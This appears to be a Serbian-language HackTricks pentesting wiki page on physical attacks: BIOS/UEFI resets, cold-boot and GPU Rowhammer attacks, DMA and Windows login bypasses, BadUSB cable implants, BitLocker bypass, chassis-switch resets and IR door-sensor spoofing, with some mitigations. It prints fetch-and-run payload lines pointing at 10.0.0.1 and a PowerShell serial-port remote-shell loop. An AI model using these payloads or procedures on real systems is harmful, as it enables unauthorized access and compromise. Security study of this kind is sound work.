# Fizički napadi

{{#include ../banners/hacktricks-training.md}}

## Oporavak BIOS lozinke i bezbednost sistema

**Resetovanje BIOS-a** može se izvršiti na nekoliko načina. Većina matičnih ploča sadrži **bateriju** koja će, ako se izvadi na oko **30 minuta**, resetovati BIOS podešavanja, uključujući lozinku. Druga mogućnost je podešavanje **jumpera na matičnoj ploči** radi resetovanja ovih podešavanja povezivanjem određenih pinova.

U situacijama kada hardverske izmene nisu moguće ili praktične, **softverski alati** nude rešenje. Pokretanje sistema sa **Live CD/USB-a** sa distribucijama kao što je **Kali Linux** omogućava pristup alatima kao što su **_killCmos_** i **_CmosPWD_**, koji mogu pomoći pri oporavku BIOS lozinke.

U slučajevima kada BIOS lozinka nije poznata, pogrešan unos **tri puta** obično dovodi do prikazivanja koda greške. Ovaj kod se može upotrebiti na veb-sajtovima kao što je [https://bios-pw.org](https://bios-pw.org) kako bi se potencijalno dobila upotrebljiva lozinka.

### UEFI bezbednost

Za savremene sisteme koji koriste **UEFI** umesto tradicionalnog BIOS-a, alat **chipsec** može se koristiti za analizu i izmenu UEFI podešavanja, uključujući onemogućavanje funkcije **Secure Boot**. To se može postići sledećom komandom:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Analiza RAM-a i Cold Boot Attacks

RAM kratko zadržava podatke nakon prekida napajanja, obično **1 do 2 minuta**. Ova postojanost može se produžiti na **10 minuta** primenom hladnih supstanci, kao što je tečni azot. Tokom ovog produženog perioda može se kreirati **memory dump** pomoću alata kao što su **dd.exe** i **volatility** radi analize.

---

## GPU Rowhammer Against Page Tables

Savremeni GPU Rowhammer napadi postaju mnogo korisniji kada ciljaju **GPU virtual-memory metadata**, umesto običnih bafera. Nedavna istraživanja na **GDDR6 NVIDIA Ampere GPUs** pokazuju da napadač koji izvršava neprivilegovani CUDA code može da napravi obrasce hammering-a specifične za GPU, koristi **memory massaging** za postavljanje paging structures u ranjive redove, a zatim izvrši flipovanje bitova u **last-level page table** ili posrednom **page directory**. Kada se jedan translation entry ošteti, napadač može da uspostavi **arbitrary GPU memory read/write**, a zatim da pređe na kompromitaciju hosta.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. **Profilisati hammerable rows** u GDDR6 i napraviti refresh-aware / non-uniform hammering patterns koji zaobilaze in-DRAM mitigacije.
2. **Izvršiti massage GPU allocations** tako da driver postavi page-translation structures na fizičke lokacije pogodne za hammering, umesto da ih zadrži u podrazumevanom zaštićenom pool-u. U praksi to može podrazumevati iscrpljivanje low-memory page-table region-a i raspršivanje velikih sparse UVM mappings sa kontrolisanim koracima.
3. **Izvršiti flip translation metadata** kao što su **PFN** ili bitovi povezani sa aperture-om unutar page-table / page-directory entry-ja, tako da virtualna stranica pod kontrolom napadača bude razrešena u page-table pages, proizvoljnu GPU memoriju ili system mappings vidljive hostu.
4. Ponovo iskoristiti falsifikovani mapping za izmenu dodatnih translation entries i eskalirati do **arbitrary GPU memory read/write** kroz različite GPU contexts.

### Host Pivot and Mitigations

- Kada je **IOMMU** onemogućen, falsifikovani system-aperture mappings mogu izložiti proizvoljnu **host physical memory** GPU-u, pretvarajući GPU primitive u potpunu kompromitaciju hosta.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** cilja last-level page-table entries, dok **GeForge** pokazuje da oštećivanje page-directory nivoa može biti jednostavnije, jer jedan flip bita može preusmeriti veće translation subtree. Ne treba smatrati samo jedan paging layer kritičnim za bezbednost.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** je i dalje važan jer blokira direktan arbitrary-host-memory path koji koriste GDDRHammer/GeForge, ali **nije potpuna mitigacija**. **GPUBreach** pokazuje second-stage pivot u kojem napadač oštećuje CPU buffers kojima može da upisuje GPU, a kojima upravlja driver, i zatim aktivira memory-safety greške u NVIDIA driver-u kako bi dobio kernel write primitive i **root shell**, čak i kada je IOMMU omogućen.<sup>[[3]](#references)</sup>
- **System-level ECC** je praktičan korak za hardening na podržanim workstation/server GPUs. Consumer GPUs bez ECC-a izlažu slabiju odbrambenu površinu.<sup>[[4]](#references)</sup>
- Ovi napadi nisu čisto teoretski: **GeForge** je prijavio **1,171** flipovanih bitova na RTX 3060 i **202** na RTX A6000, što je bilo dovoljno za izgradnju funkcionalnog lanca eskalacije privilegija na hostu.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** je alat namenjen **physical memory manipulation** putem DMA, kompatibilan sa interfejsima kao što su **FireWire** i **Thunderbolt**. Omogućava zaobilaženje login procedura izmenom memorije tako da se prihvati bilo koja lozinka. Međutim, nije efikasan protiv sistema **Windows 10**.

---

## Live CD/USB za pristup sistemu

Zamena sistemskih binarnih datoteka kao što su **_sethc.exe_** ili **_Utilman.exe_** kopijom datoteke **_cmd.exe_** može obezbediti command prompt sa sistemskim privilegijama. Alati kao što je **chntpw** mogu se koristiti za izmenu **SAM** datoteke Windows instalacije, čime se omogućava promena lozinki.

**Kon-Boot** je alat koji omogućava prijavljivanje na Windows sisteme bez poznavanja lozinke, privremenom izmenom Windows kernela ili UEFI-ja. Više informacija dostupno je na adresi [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).<sup>[[10]](#references)</sup>

---

## Rad sa Windows bezbednosnim funkcijama

### Boot i Recovery prečice

- **Supr**: Pristup BIOS podešavanjima.
- **F8**: Ulazak u Recovery mode.
- Pritiskanje tastera **Shift** nakon Windows bannera može zaobići autologon.

### BAD USB uređaji

Uređaji kao što su **Rubber Ducky** i **Teensyduino** služe kao platforme za pravljenje **bad USB** uređaja, sposobnih da izvrše unapred definisane payloads kada se povežu sa ciljnim računarom.

### Volume Shadow Copy

Administrator privileges omogućavaju kreiranje kopija osetljivih datoteka, uključujući **SAM** datoteku, putem PowerShell-a.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3 based implants kao što je **Evil Crow Cable Wind** skrivaju se unutar USB-A→USB-C ili USB-C↔USB-C kablova, enumerišu se isključivo kao USB keyboard i izlažu svoj C2 stack preko Wi-Fi-ja. Operator samo treba da napaja kabl preko hosta žrtve, kreira hotspot pod nazivom `Evil Crow Cable Wind` sa lozinkom `123456789` i otvori [http://cable-wind.local/](http://cable-wind.local/) (ili njegovu DHCP adresu) kako bi pristupio ugrađenom HTTP interface-u.<sup>[[8]](#references)</sup>
- Browser UI obezbeđuje tabove *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Sačuvani payloads označavaju se prema OS-u, keyboard layouts se menjaju u hodu, a VID/PID strings mogu se izmeniti tako da oponašaju poznate peripherals.
- Pošto se C2 nalazi unutar kabla, telefon može da pripremi payloads, pokrene njihovo izvršavanje i upravlja Wi-Fi credentials bez dodirivanja host OS-a — idealno za kratkotrajne fizičke intrusions.

### OS-aware AutoExec payloads

- AutoExec rules povezuju jedan ili više payloads sa trenutnim pokretanjem nakon USB enumeration-a. Implant obavlja osnovni OS fingerprinting i bira odgovarajuću skriptu.
- Primer workflow-a:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) ili `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Pošto se izvršavanje odvija bez nadzora, jednostavna zamena charging kabla može obezbediti “plug-and-pwn” initial access u kontekstu trenutno prijavljenog user-a.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Sačuvani payload otvara console i lepi loop koji izvršava sve što stigne na novom USB serial device-u. Minimalna Windows varijanta je:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant održava USB CDC kanal otvorenim dok njegov ESP32-S3 pokreće TCP client (Python script, Android APK ili desktop executable) nazad ka operatoru. Svi bajtovi uneti u TCP sesiju prosleđuju se u navedeni serial kanal, čime se omogućava remote command execution čak i na air-gapped hostovima. Izlaz je ograničen, pa operatori obično izvršavaju blind commands (kreiranje naloga, staging dodatnih alata itd.).

### HTTP OTA update surface

- Isti web stack obično izlaže firmware updates bez autentikacije. Evil Crow Cable Wind osluškuje `/update` i flashuje bilo koji binary koji se uploaduje:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Operateri na terenu mogu da menjaju funkcije u hodu (npr. da flešuju firmware za USB Army Knife) usred angažmana, bez otvaranja kabla, omogućavajući implantu da pređe na nove mogućnosti dok je i dalje priključen na ciljni host.

## Zaobilaženje BitLocker enkripcije

BitLocker enkripcija se potencijalno može zaobići ako se **recovery password** pronađe unutar memory dump datoteke (**MEMORY.DMP**). U tu svrhu mogu se koristiti alati kao što su **Elcomsoft Forensic Disk Decryptor** ili **Passware Kit Forensic**.

---

## Social Engineering za dodavanje recovery ključa

Novi BitLocker recovery ključ može se dodati pomoću taktika social engineeringa, ubeđivanjem korisnika da izvrši komandu koja dodaje novi recovery ključ sastavljen od nula, čime se proces dekripcije pojednostavljuje.

---

## Exploiting Chassis Intrusion / Maintenance Switches za vraćanje BIOS-a na fabrička podešavanja

Mnogi moderni laptopovi i desktop računari malog formata imaju **chassis-intrusion switch** koji nadgleda Embedded Controller (EC) i BIOS/UEFI firmware. Iako je primarna svrha switcha da podigne upozorenje kada se uređaj otvori, proizvođači ponekad implementiraju **nedokumentovanu recovery prečicu** koja se aktivira kada se switch prebaci određenim redosledom.<sup>[[5]](#references)[[6]](#references)</sup>

### Kako napad funkcioniše

1. Switch je povezan sa **GPIO interruptom** na EC-u.
2. Firmware koji radi na EC-u prati **vremenski raspored i broj pritisaka**.
3. Kada se prepozna unapred definisan obrazac, EC poziva rutinu *mainboard-reset* koja **briše sadržaj sistemskog NVRAM/CMOS-a**.
4. Prilikom sledećeg pokretanja, BIOS učitava podrazumevane vrednosti – **supervisor password, Secure Boot ključevi i sva prilagođena konfiguracija se brišu**.

> Kada je Secure Boot onemogućen, a firmware password uklonjen, napadač može jednostavno da pokrene bilo koju eksternu OS sliku i dobije neograničen pristup internim diskovima.

### Primer iz stvarnog sveta – Framework 13 Laptop

Recovery prečica za Framework 13 (11th/12th/13th-gen) je:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Nakon desetog ciklusa EC postavlja zastavicu koja nalaže BIOS-u da obriše NVRAM pri sledećem reboot-u. Ceo postupak traje ~40 s i zahteva **samo odvijač**.<sup>[[5]](#references)</sup>

### Generički postupak eksploatacije

1. Uključite metu ili izvršite suspend-resume kako bi EC bio pokrenut.
2. Uklonite donji poklopac da biste pristupili prekidaču za detekciju upada/održavanje.
3. Ponovite obrazac prebacivanja specifičan za proizvođača (pogledajte dokumentaciju i forume ili izvršite reverse-engineering firmware-a EC-a).
4. Ponovo sastavite uređaj i izvršite reboot – zaštite firmware-a bi trebalo da budu onemogućene.
5. Pokrenite live USB (npr. Kali Linux) i obavite uobičajeni post-exploitation (credential dumping, data exfiltration, ubacivanje zlonamernih EFI binarnih datoteka itd.).

### Detekcija i ublažavanje

* Beležite događaje upada u kućište u OS management konzoli i korelišite ih sa neočekivanim BIOS resetima.
* Koristite **tamper-evident seals** na zavrtnjima/poklopcima kako biste otkrili otvaranje.
* Držite uređaje u **fizički kontrolisanim prostorima**; pretpostavite da fizički pristup znači potpunu kompromitaciju.
* Ako je dostupno, onemogućite funkciju proizvođača „maintenance switch reset“ ili zahtevajte dodatnu kriptografsku autorizaciju za NVRAM resetovanje.

---

## Prikrivena IR injekcija protiv no-touch senzora za izlaz

### Karakteristike senzora
- Komercijalni „wave-to-exit“ senzori kombinuju near-IR LED emiter sa prijemnim modulom nalik prijemniku za TV daljinske upravljače, koji prijavljuje logic high tek nakon što detektuje više impulsa (~4–10) odgovarajućeg nosioca (≈30 kHz).<sup>[[7]](#references)</sup>
- Plastični poklopac sprečava direktan pogled emitera i prijemnika, pa kontroler pretpostavlja da svaki validirani nosilac potiče od obližnje refleksije i aktivira relej koji otvara električni prihvatnik vrata.
- Kada kontroler utvrdi prisustvo mete, često menja izlazni modulacioni omotač, ali prijemnik i dalje prihvata svaki burst koji odgovara filtriranom nosiocu.

### Tok napada
1. **Snimite profil emisije** – povežite logic analyser preko pinova kontrolera da biste snimili talasne oblike pre detekcije i nakon nje, koji upravljaju internim IR LED-om.
2. **Reprodukujte samo „post-detection“ talasni oblik** – uklonite/zanemarite fabrički emiter i upravljajte eksternim IR LED-om pomoću već aktiviranog obrasca od samog početka. Pošto prijemnik proverava samo broj impulsa/frekvenciju, tretira spoofovani nosilac kao autentičnu refleksiju i aktivira relejsku liniju.
3. **Ograničite prenos** – emitujte nosilac u podešenim burstovima (npr. nekoliko desetina milisekundi uključen, približno isto toliko isključen) kako biste isporučili minimalan broj impulsa bez zasićenja AGC-a prijemnika ili njegove logike za obradu smetnji. Kontinuirana emisija brzo desenzitizuje senzor i sprečava aktiviranje releja.

### Reflektujuća injekcija velikog dometa
- Zamena laboratorijskog LED-a snažnom IR diodom, MOSFET driverom i fokusirajućom optikom omogućava pouzdano aktiviranje sa udaljenosti od ~6 m.
- Napadaču nije potrebna direktna vidljivost otvora prijemnika; usmeravanje zraka ka unutrašnjim zidovima, policama ili okvirima vrata koji se vide kroz staklo omogućava reflektovanoj energiji da uđe u vidno polje od ~30° i oponaša mahanje rukom iz neposredne blizine.
- Pošto prijemnici očekuju samo slabe refleksije, mnogo snažniji eksterni zrak može se odbiti od više površina i i dalje ostati iznad praga detekcije.

### Weaponised Attack Torch
- Ugradnja drivera u komercijalnu baterijsku lampu skriva alat tako da izgleda uobičajeno. Zamenite vidljivi LED snažnim IR LED-om usklađenim sa opsegom prijemnika, dodajte ATtiny412 (ili sličan mikrokontroler) za generisanje burstova od ≈30 kHz i upotrebite MOSFET za odvođenje struje LED-a.
- Teleskopsko zoom sočivo sužava zrak radi dometa/preciznosti, dok vibracioni motor pod kontrolom MCU-a pruža haptičku potvrdu da je modulacija aktivna, bez emitovanja vidljive svetlosti.
- Cikliranje kroz nekoliko sačuvanih obrazaca modulacije (nešto različite frekvencije nosioca i omotači) povećava kompatibilnost sa različitim rebrendiranim porodicama senzora, omogućavajući operateru da prelazi preko reflektujućih površina dok relej čujno ne klikne i vrata se ne otvore.

---

## Reference

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [raymond.cc - Login To Windows Administrator And Linux Root Account Without Knowing Or Changing Current Password](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password)

{{#include ../banners/hacktricks-training.md}}
